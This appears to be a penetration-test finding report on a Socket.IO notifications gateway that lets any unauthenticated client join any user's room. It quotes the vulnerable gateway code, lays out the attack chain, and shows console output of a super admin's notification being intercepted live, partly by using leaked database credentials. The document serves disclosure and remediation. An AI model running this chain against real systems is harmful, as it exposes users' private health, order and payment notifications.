# WebSocket Notification Hijack — CRITICAL (Live-Confirmed)

## Vulnerability Summary

The Socket.IO gateway (`/notifications`) accepts connections with **no
authentication handshake** and lets any client subscribe to **any user's**
notification room by passing their user ID. Anonymous attackers can receive
the victim's realtime notifications (orders, payments, prescriptions,
admin alerts) and can also spam-subscribe for mass surveillance.

**Status:** ✅ CONFIRMED ON LIVE — 2026-08-11
**Severity:** Critical (realtime PHI/ops interception)

---

## 1. Vulnerability Identification Process

### 1.1 Static review

`src/notifications/notifications.gateway.ts`:

```typescript
@WebSocketGateway({ cors: { origin: '*' }, namespace: 'notifications' })
export class NotificationsGateway {
  handleConnection(client: Socket) { this.logger.log(`Client connected: ${client.id}`); }

  @SubscribeMessage('subscribeToUser')
  handleSubscribe(client: Socket, userId: string) {
    client.join(`user_${userId}`);   // ← no authentication, no authorization
    return { event: 'subscribed', data: userId };
  }

  sendNotificationToUser(userId, notification) {
    this.server.to(`user_${userId}`).emit('newNotification', notification);
  }
}
```

- `cors: { origin: '*' }` — any origin may open a socket.
- `subscribeToUser` accepts an arbitrary `userId` — a room name is
  `user_<id>`, and user IDs are not secret (they appear in API responses,
  seed data, and the public pharmacy listing `userId` field).
- No JWT middleware on the socket handshake.

### 1.2 Dynamic confirmation (full chain)

1. Connected to `/notifications` with **no token**.
2. Subscribed to the **super admin's** room (`user_00000000-…-0001`).
3. Registered a throwaway hospital (public endpoint), read its email
   verification code **straight from the DB** (leaked creds), verified the
   email — this triggers `notifySuperAdminsNewHospital()`.
4. **Captured the super admin's realtime notification live**:

```
[+] Connected WITHOUT token, socket: 9ZMp0ifMgntl16YXAAAD
[+] Subscribed to room user_00000000-0000-0000-0000-000000000001 (super admin)
[+] Registering throwaway hospital: ws_poc_1786451451592@test.com
[+] register -> {"message":"Registration successful!...","userId":"bef51ab7-..."}
[+] verification code pulled from DB via leaked creds: 99977
[+] verify-email -> {"message":"Email verified successfully!","verified":true}
[!!!] INTERCEPTED SUPER-ADMIN NOTIFICATION:
  {"id":"456a4560-...","userId":"00000000-...-0001","type":"PHARMACY_APPROVED",
   "title":"New Hospital Application","message":"WS-PoC Hospital has registered and..."}
```

*(Throwaway hospital + notification removed after the test.)*

---

## 2. Attack Chain

```
Anonymous socket.io client
  → ws://…/notifications (CORS *, no JWT handshake)
  → emit subscribeToUser(<victim-user-id>)
  → receive every newNotification for that user in realtime
  → scale to many victims = mass surveillance of orders/payments/PHI events
```

---

## 3. Evidence (2026-08-11)

```
connect      → OK (no auth)
subscribeToUser → joined user_<super-admin-id> (no error)
newNotification → received super-admin alert payload live
```

---

## 4. Files

| File | Purpose |
|---|---|
| `exploit.js` | Reusable node script — connect, hijack a room, log intercepted notifications |
| `remediation.md` | Step-by-step remediation |
